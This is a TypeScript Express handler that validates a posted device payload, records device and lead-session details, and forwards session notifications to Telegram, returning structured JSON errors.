import { RequestHandler } from "express";
import { deviceSchema } from "../schemas/device.schema.js";
import { describeDevice, prospectDevice } from "../methods/device.methods.js";
import {
  restartLeadSession,
  updateLeadSession,
} from "../methods/lead.methods.js";
import { sendSessionToTelegram } from "../methods/session.methods.js";

export const devicePostHandler: RequestHandler = async (request, response) => {
  const device = deviceSchema.safeParse(request.body);
  if (!device.success) {
    const first = device.error.issues[0];
    return response.status(400).json({
      ok: false,
      error: {
        code: "INVALID_DEVICE_PAYLOAD",
        message: first?.message ?? "Invalid device payload.",
        field: first?.path.join(".") ?? null,
      },
    });
  }
  try {
    const deviceStatus = await prospectDevice(device.data);
    const deviceInfo = await describeDevice(device.data.clientId);
    if (deviceInfo) {
      const session = await restartLeadSession(device.data.sessionId, {
        merge: true,
        notification: deviceInfo,
      });
      const result = await sendSessionToTelegram(session, { resend: true });
      await updateLeadSession(device.data.sessionId, result);
    }
    response.json(deviceStatus);
  } catch (err) {
    console.error("Device registration failed:", err);
    response.status(500).json({
      ok: false,
      error: {
        code: "DEVICE_REGISTER_FAILED",
        message: "Device registration failed.",
      },
    });
  }
};
